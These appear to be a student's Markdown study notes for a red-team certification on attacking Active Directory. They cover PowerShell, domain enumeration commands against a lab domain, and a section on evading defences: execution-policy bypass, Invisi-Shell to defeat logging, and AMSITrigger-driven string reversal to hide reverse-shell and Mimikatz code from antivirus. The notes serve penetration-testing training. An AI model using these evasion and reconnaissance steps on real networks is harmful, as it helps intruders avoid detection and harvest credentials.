# Active Directory
- Directory Service used to managed Windows networks
- every thing is an object in the active directoy (user is an object ,computer is an object and so on )
- Stores information about objects on the network and makes it easily available to users and admins
  
![activ](https://github.com/Islamkafafy123/CRTP/blob/main/pictures/activ.jpeg)
- it provide manegability ,security and iterpolirity to all the objects
- Components
  - Schema –> Defines objects and their attributes
  - Query and index mechanism - > Provides searching and publication of objects and their properties
  - Global Catalog -> Contains information about every object in the directory (each domain have replica of other domain )
  - Replication Service –> Distributes information across domain controllers
- Structure
  - when you hear AD think of it as a forest not domain
  - Forests, domains and organization units (OUs) are the basic building blocks of any active directory structure
![forest](https://github.com/Islamkafafy123/CRTP/blob/main/pictures/forest.jpeg)

# Powershell
- Provides access to almost everything in a Windows platform and Active Directory Environment which could be useful for an attacker
- Provides the capability of running powerful scripts completely from memory making it ideal for foothold shells/boxes
- PowerShell is NOT powershell.exe. It is the System.Management.Automation.dll
- Load a PowerShell script using dot sourcing which is . then space then script
```
. C:\AD\Tools\PowerView.ps1
```
- module (or a script) can be imported with import-module
```
Import-Module C:\AD\Tools\ADModulemaster\ActiveDirectory\ActiveDirectory.psd1
```
- All the commands in a module can be listed with
```
Get-Command -Module <modulename>
```
- .ps1 is extension of powershell
- .psd1 .. etc are extension of powershell module
- to interact with AD USing Powershell
  - [ADSI]
  - .NET Classes System.DirectoryServices.ActiveDirectory
  - Native Executable
  - WMI using PowerShell
  - ActiveDirectory Module
- Powershell Detection
  - System-wide transcription --> if enabled all the commands and thier output in powershell is logged in flat file 
  - Script Block logging --> Two types (Warning(Default) - Verbose )
    - warning only bad word from the keyboard is logged
    - verbose almost evreything you run in powershell is logged 
  - AntiMalware Scan Interface (AMSI)
    - when script is running it steps in and askes the av for this script if its in the signutes the av has or not
  - Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)
    -  language mode of PowerShell designed to support day-to-day administrative tasks, yet restrict access to sensitive language elements that can be used to invoke arbitrary Windows APIs
- Execution Poilcy is NOT a security measure, it is present to prevent user from accidently executing scripts and to bypass
```
powershell –ExecutionPolicy bypass
powershell –c <cmd>
powershell –encodedcommand
$env:PSExecutionPolicyPreference="bypass"
```
# Bypassing PowerShell Security
- use Invisi-Shell (https://github.com/OmerYa/Invisi-Shell) for bypassing the security controls in PowerShell.
  - The tool hooks the .NET assemblies (System.Management.Automation.dll and System.Core.dll) to bypass logging
- Using Invisi-Shell
  - With admin privileges: RunWithPathAsAdmin.bat
  - With non-admin privileges: RunWithRegistryNonAdmin.bat
  - Type exit from the new PowerShell session to complete the clean-up.
- We can always load scripts in memory and avoid detection using AMSI bypass
- to  bypass signature based detection of on-disk PowerShell scripts by Windows Defender
- use the AMSITrigger (https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected
- provide path to the script file to scan it
```
AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1
```
- For full obfuscation of PowerShell scripts, see Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation).
- to avoid signature based detection are pretty simple:
  -  Scan using AMSITrigger
  -  Modify the detected code snippet
  -  Rescan using AMSITrigger
  -  Repeat the steps 2 & 3 till we get a result as “AMSI_RESULT_NOT_DETECTED” or “Blank”
- Powerup is a scripted powershell that can scan for privilage escalation on the local machine
- we run amsitrigger on power up and we found the detected code snipped we reverse it and run amsi again untill we found nothing
```
Reverse the "System.AppDomain" string on line number 59
$String ='niamoDppA.metsyS’
$classrev = ([regex]::Matches($String,'.','RightToLeft') | ForEach{$_.value}) -join ‘’
$AppDomain =
[Reflection.Assembly].Assembly.GetType("$classrev").GetProperty('Cur
rentDomain').GetValue($null, @())
```
- Invoke-PowerShellTcp used to get reverseshell
- we sacn it using amsitriiger and
```
Reverse the "Net.Sockets" string on line number 32
$String =
"stekcoS.teN"
$class = ([regex]::Matches($String,'.',
'RightToLeft') | ForEach
{$_.value}) -join ''
if ($Reverse)
{
$client = New-Object System.$class.TCPClient($IPAddress,$Port)
}
```
- this reverse thing is just the easy way not the only way
- Invoke-Mimikatz is THE most heavily signature PowerShell script!
- We must rename it before scanning with AmsiTrigger or we get an access denied
- We need to make the following changes:
  - Remove the comments.
  - Modify each use of "DumpCreds".
  - Modify the variable names of the Win32 API calls that are detected.
  - Reverse the strings that are detected and the Mimikatz Compressed DLL string
  
# Methodology
- we need to assume breach
- It is more likely that an organization has already been compromised, but just hasn't discovered it yet
- so our approuch is like this :

![simu](https://github.com/Islamkafafy123/CRTP/blob/main/pictures/simu.jpeg) 

# Domain Enumeration
- we have to imagine the whole domain after enumration
- For enumeration
  - The ActiveDirectory PowerShell module (MS signed and works even in PowerShell CLM)
    https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps
    https://github.com/samratashok/ADModule
  ```
  Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
  Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
  ```
  - BloodHound (C# and PowerShell Collectors) https://github.com/BloodHoundAD/BloodHound
  - PowerView (PowerShell) https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1
  ```
  . C:\AD\Tools\PowerView.ps1
  ```
  - SharpView (C#) - Doesn't support filtering using Pipeline https://github.com/tevora-threat/SharpView/
- Get current domain
```
Get-Domain (PowerView)
Get-ADDomain (ActiveDirectory Module)
```
- Get object of another domain
```
Get-Domain –Domain moneycorp.local
Get-ADDomain -Identity moneycorp.local
```
- Get domain SID for the current domain
```
Get-DomainSID
(Get-ADDomain).DomainSID
```
- Get domain policy for the current domain
```
Get-DomainPolicyData
(Get-DomainPolicyData).systemaccess
(Get-DomainPolicyData).kerberospolicy -- > check again to avoid detectio nfor detection mechanism

```
- Get domain policy for another domain
```
(Get-DomainPolicyData –domain
moneycorp.local).systemaccess
```
- Get domain controllers for the current domain
```
Get-DomainController
Get-ADDomainController

```
- Get domain controllers for another domain
```
Get-DomainController –Domain moneycorp.local
Get-ADDomainController -DomainName moneycorp.local -Discover
```
- Get a list of users in the current domain
```
Get-DomainUser
Get-DomainUser –Identity student1
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity student1 -Properties *
```
- Get list of all properties for users in the current domain
```
Get-DomainUser -Identity student1 -Properties * 
Get-DomainUser -Properties samaccountname,logonCount
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -
MemberType *Property | select Name
Get-ADUser -Filter * -Properties * | select
name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
```
- Search for a particular string in a user's attributes:
```
Get-DomainUser -LDAPFilter "Description=*built*" |
Select name,Description

Get-ADUser -Filter 'Description -like "*built*"' -
Properties Description | select name,Description
```
- Get a list of computers in the current domain
```
Get-DomainComputer | select Name
Get-DomainComputer –OperatingSystem "*Server 2016*"
Get-DomainComputer -Ping

Get-ADComputer -Filter * | select Name
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -
Properties OperatingSystem | select Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{TestConnection -Count 1 -ComputerName $_.DNSHostName}

```
- Get all the groups in the current domain
```
Get-DomainGroup | select Name
Get-DomainGroup –Domain <targetdomain>

Get-ADGroup -Filter * | select Name 
Get-ADGroup -Filter * -Properties *
```
- Get all groups containing the word "admin" in group name
```
Get-DomainGroup *admin*

Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
```
- Get all the members of the Domain Admins group
```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

Get-ADGroupMember -Identity "Domain Admins" -Recursive 
```
- Get the group membership for a user
```
Get-DomainGroup –UserName "student1"

Get-ADPrincipalGroupMembership -Identity student1
```
- List all the local groups on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroup -ComputerName dcorp-dc -ListGroups
```
- Get members of all the local groups on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroup -ComputerName dcorp-dc -Recurse
```
- Get members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
```
- Get actively logged users on a computer (needs local admin rights on the target)
```
Get-NetLoggedon –ComputerName <servername>
```
- Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)
```
Get-LoggedonLocal -ComputerName dcorp-dc
```
- Get the last logged user on a computer (needs administrative rights and remote registry on the target)
```
Get-LastLoggedOn –ComputerName <servername>
```
- Find shares on hosts in current domain
```
Invoke-ShareFinder –Verbose
```
- Find sensitive files on computers in the domain
```
Invoke-FileFinder –Verbose
```
- Get all fileservers of the domain
```
Get-NetFileServer
```
